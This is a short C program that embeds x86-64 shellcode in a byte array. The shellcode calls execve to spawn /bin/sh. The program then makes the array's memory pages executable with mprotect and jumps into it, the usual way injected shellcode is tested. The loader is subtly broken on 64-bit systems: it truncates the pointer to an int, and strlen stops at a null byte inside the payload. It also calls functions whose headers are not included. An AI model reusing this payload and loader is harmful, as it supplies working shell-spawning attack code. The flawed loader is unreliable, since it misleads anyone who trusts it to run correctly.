#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";

int main() {
    void (*code)() = (void *) buf;
    int addr = (int) code;
    int pagesize = getpagesize();
    int addr_page = (addr / pagesize) * pagesize;
    for (int i = addr_page; i < addr + strlen(buf); i += pagesize) {
        mprotect(i, pagesize, 0x7);
    }

    code();
}

